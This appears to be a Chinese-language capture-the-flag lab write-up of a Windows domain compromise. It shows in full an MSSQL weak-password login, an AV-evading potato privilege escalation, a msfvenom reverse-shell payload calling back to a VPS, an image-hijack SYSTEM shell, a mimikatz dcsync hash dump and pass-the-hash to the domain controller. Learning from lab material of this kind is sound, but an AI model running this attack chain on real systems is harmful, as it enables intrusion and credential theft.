<html>
<body>
<!--StartFragment--><!-- obsidian --><h1 data-heading="外网">外网</h1>
<p>很简单的外网入口，也很流水线</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 39.99.226.61

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.226.61:1433 open
39.99.226.61:135 open
39.99.226.61:80 open
39.99.226.61:139 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]39.99.226.61
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:14c9:d206:34cf:356:d89c:1dc2
[*] WebTitle http://39.99.226.61       code:200 len:703    title:IIS Windows Server
[+] mssql 39.99.226.61:1433:sa 1qaz!QAZ
</code></pre>
<p>sql server 弱密码，直接连上去拿shell就行了</p>

<img width="1559" height="889" alt="Image" src="https://github.com/user-attachments/assets/6b37b918-84e5-4833-b32b-4a9f6fddeda1" />

<pre><code class="language-cmd">$ tasklist
映像名称                       PID 会话名              会话#       内存使用 
========================= ======== ================ =========== ============
System Idle Process              0                            0          4 K
System                           4                            0        136 K
smss.exe                       244                            0      1,216 K
csrss.exe                      336                            0      6,052 K
wininit.exe                    412                            0      5,704 K
csrss.exe                      420                            1      5,832 K
winlogon.exe                   472                            1     13,764 K
services.exe                   540                            0      7,820 K
lsass.exe                      548                            0     17,184 K
svchost.exe                    652                            0     19,536 K
svchost.exe                    712                            0      9,560 K
dwm.exe                        808                            1     30,348 K
svchost.exe                    824                            0    303,368 K
svchost.exe                    832                            0     56,504 K
svchost.exe                    920                            0     21,956 K
svchost.exe                    988                            0     24,740 K
svchost.exe                    304                            0     16,440 K
svchost.exe                    424                            0     20,484 K
svchost.exe                   1040                            0     27,884 K
svchost.exe                   1052                            0      7,432 K
svchost.exe                   1200                            0     11,276 K
svchost.exe                   1548                            0      6,916 K
spoolsv.exe                   1608                            0     21,772 K
svchost.exe                   1704                            0     10,720 K
svchost.exe                   1824                            0      8,364 K
svchost.exe                   1856                            0     18,152 K
svchost.exe                   1872                            0     11,200 K
svchost.exe                   1868                            0     11,624 K
svchost.exe                   1884                            0     26,968 K
sqlwriter.exe                 1892                            0      8,028 K
svchost.exe                   1908                            0     17,904 K
sqlceip.exe                   2824                            0     37,164 K
sqlceip.exe                   2832                            0     54,124 K
sqlservr.exe                  2840                            0    407,752 K
sqlceip.exe                   2848                            0     50,232 K
MsDtsSrvr.exe                 2856                            0     24,372 K
ReportingServicesService.     2868                            0     87,036 K
msmdsrv.exe                   3024                            0     52,516 K
svchost.exe                   3228                            0      7,716 K
Microsoft.ReportingServic     3880                            0     85,980 K
conhost.exe                   3888                            0     10,732 K
mpdwsvc.exe                   4204                            0    193,332 K
mpdwsvc.exe                   4212                            0    328,096 K
fdlauncher.exe                4496                            0      5,184 K
fdhost.exe                    4520                            0      6,624 K
conhost.exe                   4528                            0      9,024 K
WmiPrvSE.exe                  4768                            0     15,760 K
LogonUI.exe                   4928                            1     44,688 K
TrustedInstaller.exe          4464                            0    237,084 K
TiWorker.exe                  2028                            0    192,972 K
WmiPrvSE.exe                  5280                            0      8,308 K
AliYunDunUpdate.exe           5500                            0      9,648 K
svchost.exe                   5704                            0     13,100 K
WmiPrvSE.exe                  1904                            0      8,928 K
aliyun_assist_service.exe     5636                            0     24,520 K
w3wp.exe                      5768                            0     14,388 K
csrss.exe                     5776                            2      5,832 K
winlogon.exe                  5812                            2      8,140 K
dwm.exe                       5624                            2     31,224 K
rdpclip.exe                    480                            2     13,264 K
RuntimeBroker.exe             2040                            2     22,316 K
sihost.exe                    2592                            2     18,824 K
svchost.exe                   2876                            2     18,812 K
taskhostw.exe                 2924                            2     15,396 K
ChsIME.exe                    5464                            2     16,324 K
explorer.exe                  2432                            2     60,552 K
ShellExperienceHost.exe       3896                            2     35,576 K
SearchUI.exe                  1112                            2     36,652 K
backgroundTaskHost.exe        6872                            2     23,948 K
jusched.exe                   7016                            2      7,116 K
AliYunDun.exe                 7112                            0     15,260 K
argusagent_service.exe        7036                            0      8,388 K
argusagent.exe                7048                            0      9,900 K
conhost.exe                   6784                            0      7,292 K
cmd.exe                       7088                            0      2,764 K
argusagent.exe                2732                            0     80,580 K
AliYunDunMonitor.exe          3384                            0     20,692 K
msdtc.exe                     2692                            0     10,076 K
cmd.exe                       2632                            0      2,772 K
conhost.exe                   6484                            0      9,660 K
tasklist.exe                  7040                            0      7,824 K
</code></pre>
<p>重点可以看到阿里云盾，土豆得过一下免杀，不过免杀的土豆，总是没法指定参数，所以自己写死加个管理员编译免杀就行</p>
<pre><code class="language-cmd">$ C:\Users\Public\error.exe
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\WIN-WEB/pipe/b67b39f2-87cf-4c56-8e73-c092f93fc69c
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
</code></pre>
<p>rdp上去就行了</p>
<h1 data-heading="内网">内网</h1>
<p>上线一下vshell搭个隧道，这里我fscan扫一下没什么能进去的服务，就大概猜到开始域渗透了，毕竟是刚入门，跟着wp打了</p>

IP | 主机名 | 域 | 操作系统 | 关键信息 |   |  
-- | -- | -- | -- | -- | -- | --
172.22.8.15 | DC01 | xiaorang.lab | Windows Server 2022 / Build 10.0.20348 | 疑似域控，开放 DNS、LDAP、RDP、SMB、RPC 等 |   |  
172.22.8.31 | WIN19-CLIENT | xiaorang.lab | Windows Server 2019 / Windows 10 Build 17763 | 开放 RDP、SMB、RPC 等 |   |  
172.22.8.46 | WIN2016 | xiaorang.lab | Windows 10 1607 / Windows Server 2016 Build 14393 | 开放 IIS、RDP、SMB、RPC 等 |   |  


<p>生成个马子</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=9999 -f exe -o msf.exe
</code></pre>
<pre><code>msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost vps
msf exploit(multi/handler) > set lport 10002
lport => 10002
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:10002
</code></pre>
<p>这里看大佬们讲是Tsclient，默认rdp连接远程机时不会挂载本地机的任何盘符，这里john rdp连我们控的这台机器，设置了挂载它本地的c盘，所以迁移到john用户可以读到31的盘</p>
<p>下面这几个命令就能明显显示出来为什么以john身份登录还是看不到挂载的盘，涉及到进程迁移，找到john的进程迁移过去然后以john令牌开shell就行了，这里我看文章都没有讲，大概是自己刚入门win这方面</p>
<pre><code>meterpreter > shell
Process 1616 created.
Channel 14 created.
Microsoft Windows [�汾 10.0.14393]
(c) 2016 Microsoft Corporation����������Ȩ����

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32>whoami
whoami
win-web\john

C:\Windows\system32>net use
net use
New connections will be remembered.

There are no entries in the list.


C:\Windows\system32>dir \\tsclient\C
dir \\tsclient\C
The network name cannot be found.

C:\Windows\system32>dir \\tsclient\C$
dir \\tsclient\C$
The network name cannot be found.

C:\Windows\system32>quser
quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 john                  rdp-tcp#0           2  Active         25  2026/9/10 8:58
>mj                    rdp-tcp#6           3  Active          2  2026/9/10 9:05

C:\Windows\system32>exit
exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                           Path
 ---   ----  ----               ----  -------  ----                           ----
 0     0     [System Process]
 4     0     System             x64   0
 244   4     smss.exe           x64   0
 304   540   svchost.exe        x64   0
 336   328   csrss.exe
 344   652   ChsIME.exe
 412   328   wininit.exe        x64   0
 420   404   csrss.exe
 424   540   svchost.exe        x64   0
 472   404   winlogon.exe       x64   1
 480   832   rdpclip.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\rdpclip.e
                                                                              xe
 540   412   services.exe       x64   0
 548   412   lsass.exe          x64   0
 652   540   svchost.exe        x64   0
 712   540   svchost.exe        x64   0
 784   652   SearchUI.exe
 808   472   dwm.exe
 824   540   svchost.exe        x64   0
 832   540   svchost.exe        x64   0
 920   540   svchost.exe        x64   0
 988   540   svchost.exe        x64   0
 1040  540   svchost.exe        x64   0
 1052  540   svchost.exe        x64   0
 1112  652   SearchUI.exe       x64   2        WIN-WEB\John                   C:\Windows\SystemApps\Microso
                                                                              ft.Windows.Cortana_cw5n1h2txy
                                                                              ewy\SearchUI.exe
 1420  3076  dwm.exe
 1548  540   svchost.exe        x64   0
 1608  540   spoolsv.exe        x64   0
 1704  540   svchost.exe        x64   0
 1712  652   ShellExperienceHo
             st.exe
 1824  540   svchost.exe        x64   0
 1856  540   svchost.exe        x86   0
 1868  540   svchost.exe        x64   0
 1872  540   svchost.exe        x64   0
 1884  540   svchost.exe        x64   0
 1892  540   sqlwriter.exe      x64   0
 1908  540   svchost.exe        x64   0
 2012  824   sihost.exe
 2040  652   RuntimeBroker.exe  x64   2        WIN-WEB\John                   C:\Windows\System32\RuntimeBr
                                                                              oker.exe
 2432  5268  explorer.exe       x64   2        WIN-WEB\John                   C:\Windows\explorer.exe
 2592  824   sihost.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\sihost.ex
                                                                              e
 2692  540   msdtc.exe          x64   0
 2732  7088  argusagent.exe     x64   0
 2824  540   sqlceip.exe        x64   0        NT SERVICE\SSISTELEMETRY130
 2832  540   sqlceip.exe        x64   0        NT SERVICE\SSASTELEMETRY
 2840  540   sqlservr.exe       x64   0        NT SERVICE\MSSQLSERVER
 2848  540   sqlceip.exe        x64   0        NT SERVICE\SQLTELEMETRY
 2856  540   MsDtsSrvr.exe      x64   0        NT SERVICE\MsDtsServer130
 2868  540   ReportingServices  x64   0        NT SERVICE\ReportServer
             Service.exe
 2876  540   svchost.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\svchost.e
                                                                              xe
 2924  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
                                                                              .exe
 3024  540   msmdsrv.exe        x64   0        NT SERVICE\MSSQLServerOLAPSer
                                               vice
 3076  2864  winlogon.exe       x64   3
 3384  7112  AliYunDunMonitor.  x86   0
             exe
 3520  540   svchost.exe        x64   0
 3784  7016  jucheck.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
                                                                               Files\Java\Java Update\juche
                                                                              ck.exe
 3880  2868  Microsoft.Reporti
             ngServices.Portal
             .WebHost.exe
 3888  3880  conhost.exe
 3896  652   ShellExperienceHo  x64   2        WIN-WEB\John                   C:\Windows\SystemApps\ShellEx
             st.exe                                                           perienceHost_cw5n1h2txyewy\Sh
                                                                              ellExperienceHost.exe
 4204  540   mpdwsvc.exe        x64   0
 4212  540   mpdwsvc.exe        x64   0
 4496  540   fdlauncher.exe     x64   0        NT SERVICE\MSSQLFDLauncher
 4520  4496  fdhost.exe         x64   0        NT SERVICE\MSSQLFDLauncher     C:\Program Files\Microsoft SQ
                                                                              L Server\MSSQL13.MSSQLSERVER\
                                                                              MSSQL\Binn\fdhost.exe
 4528  4520  conhost.exe
 4532  8104  e22b16cetcp.exe    x64   3        WIN-WEB\mj                     C:\Users\Public\e22b16cetcp.e
                                                                              xe
 4768  652   WmiPrvSE.exe
 4832  832   rdpclip.exe
 4876  652   RuntimeBroker.exe
 4900  2864  csrss.exe
 4928  472   LogonUI.exe        x64   1
 4988  8132  jucheck.exe
 5004  5228  explorer.exe
 5280  652   WmiPrvSE.exe
 5464  652   ChsIME.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\InputMeth
                                                                              od\CHS\ChsIME.exe
 5500  540   AliYunDunUpdate.e  x86   0
             xe
 5564  5004  msf.exe            x64   3        WIN-WEB\mj                     C:\msf.exe
 5624  5812  dwm.exe
 5636  540   aliyun_assist_ser  x64   0
             vice.exe
 5768  1868  w3wp.exe           x64   0        IIS APPPOOL\DefaultAppPool     C:\Windows\System32\inetsrv\w
                                                                              3wp.exe
 5776  5984  csrss.exe
 5812  5984  winlogon.exe       x64   2
 5860  8104  conhost.exe        x64   3        WIN-WEB\mj                     C:\Windows\System32\conhost.e
                                                                              xe
 5868  652   WmiPrvSE.exe
 6248  824   taskhostw.exe
 6604  540   svchost.exe        x64   3        WIN-WEB\mj
 6712  540   svchost.exe        x64   0
 6784  7048  conhost.exe        x64   0
 6864  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
                                                                              .exe
 7016  6972  jusched.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
                                                                               Files\Java\Java Update\jusch
                                                                              ed.exe
 7036  540   argusagent_servic  x64   0
             e.exe
 7048  6464  argusagent.exe     x64   0
 7088  7048  cmd.exe            x64   0
 7112  540   AliYunDun.exe      x86   0
 7296  540   svchost.exe        x64   0
 7628  824   taskhostw.exe      x64   3        WIN-WEB\mj                     C:\Windows\System32\taskhostw
                                                                              .exe
 7908  652   dllhost.exe
 8056  652   ChsIME.exe
 8104  4876  cmd.exe            x64   3        WIN-WEB\mj                     C:\Windows\System32\cmd.exe
 8132  8096  jusched.exe

meterpreter > migrate 7016
[*] Migrating from 5564 to 7016...
[*] Migration completed successfully.
meterpreter > shell
Process 6868 created.
Channel 1 created.
Microsoft Windows [�汾 10.0.14393]
(c) 2016 Microsoft Corporation����������Ȩ����

C:\Windows\SysWOW64>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\SysWOW64>whoami
whoami
win-web\john

C:\Windows\SysWOW64>quesr
quesr
'quesr' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\SysWOW64>quser
quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>john                  rdp-tcp#0           2  Active         26  2026/9/10 8:58
 mj                    rdp-tcp#6           3  Active          3  2026/9/10 9:05

C:\Windows\SysWOW64>net use
net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
The command completed successfully.
</code></pre>
<p>读到凭据和hint</p>
<pre><code>C:\Windows\SysWOW64>type \\TSCLIENT\C\*.txt
type \\TSCLIENT\C\*.txt

\\TSCLIENT\C\credential.txt


xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
</code></pre>
<p>域内就这几台机器撞一下密码看看哪个能登上去</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc crackmapexec smb 172.22.8.15 172.22.8.31 172.22.8.46 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.46:445  ...  172.22.8.31:445  ...  OK
 ...  OK
 ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.31:445 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  OK
 ...  172.22.8.46:135  ...  OK
 ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001 SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  172.22.8.46:445  ...  172.22.8.31:135  ...  OK
 ...  OK
 ...  OK
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRE
</code></pre>
<p>紫色代表密码过期登上去需要修改一下,不过DC还是上不去的，我上了46</p>
<pre><code>C:\Users\Aldrich>net group "Domain Admins" /domain
这项请求将在域 xiaorang.lab 的域控制器处理。

组名     Domain Admins
注释     指定的域管理员

成员

-------------------------------------------------------------------------------
Administrator            WIN2016$
命令成功完成。


C:\Users\Aldrich>

</code></pre>
<p>看一下域管，这个WIN2016$是机器账户，正好就是46，抓到他的hash就能拿下整个域了，但是抓hash得system，还得先提权</p>
<pre><code>┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p '123.com' -r disk:share=/tmp/test/yunjing/dc
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Autoselecting keyboard map 'en-us' from locale
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.46:3389  ...  OK
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.46:3389  ...  OK
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
</code></pre>
<p>拉个共享转文件用</p>
<p>这里提权看是镜像劫持<br>
用get-acl查看IFEO权限，fl命令是为了把一行显示为多行</p>
<pre><code class="language-powershell">PS C:\Users\Aldrich> Get-ACL -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | f
l


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
          Execution Options
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
Audit  :
Sddl   : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)(A;CI;KR;;;AC)
</code></pre>
<p>Authenticated Users指的是所有非来宾用户</p>
<p>把cmd绑定到放大镜上</p>
<pre><code class="language-powwershell">
PS C:\Users\Aldrich> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
操作成功完成。
PS C:\Users\Aldrich>
</code></pre>
<p>然后进到锁定页面点放大镜就能拿到system shell</p>

<img width="1237" height="889" alt="Image" src="https://github.com/user-attachments/assets/7a9d05ce-0fbb-4780-90d1-d6ecc62f9c3f" />

<p>抓取hash横向即可</p>
<pre><code>C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Aldrich\mimikatz_trunk\x64


C:\Users\Aldrich\mimikatz_trunk\x64>mimikatz.exe "lsadump::dcsync /domain:xiaora
ng.lab /all /csv" exit
mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514
1000    DC01$   851d88ade07955b4f42bf69026579528        532480
500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512
1103    WIN2016$        011b8f2bd7c747b306a70cfcd4378d21        16781312
1104    WIN19-CLIENT$   c9a0ac481218f639a58f3b14552f0095        16781312
1105    Aldrich afffeba176210fad4628f0524bfe1942        512

mimikatz(commandline) # exit
Bye!
</code></pre>
<p>这里我想因为这台机器账户是域管，所以这台机器的管理就是域管管理，大差不差吧，这里抓到了域用户所有的凭据，直接admin横向就行了</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test]
└─# pc impacket-wmiexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:59112  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\administrator

C:\>
</code></pre>
<p>之前查到win2016$这个机器账户也是域管，试试能不能上去</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test]
└─# pc impacket-wmiexec -hashes :011b8f2bd7c747b306a70cfcd4378d21 xiaorang.lab/WIN2016\$@172.22.8.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:59112  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\win2016$

C:\>type C:\users\administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-'
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/


Congratulations! ! !

flag03: flag{c541ceef-42b5-4a80-8af7-cbe82419422b}

C:\>
</code></pre>
<p>看来可以，不过$得转义一下</p><!--EndFragment-->
</body>
</html>